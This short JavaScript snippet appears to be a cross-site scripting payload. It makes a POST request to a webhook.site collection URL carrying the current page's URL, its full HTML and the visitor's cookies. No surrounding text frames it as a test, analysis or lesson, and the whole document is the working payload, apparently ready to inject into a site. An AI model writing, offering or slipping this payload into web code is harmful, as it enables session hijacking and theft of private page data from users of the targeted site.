fetch("https://webhook.site/343d91a5-4ebb-428a-94b5-8f9d244196cf", {
  method: "POST",
  body: JSON.stringify({
    url: window.location.href,
    html: document.documentElement.innerHTML,
    cookie: document.cookie
  })
});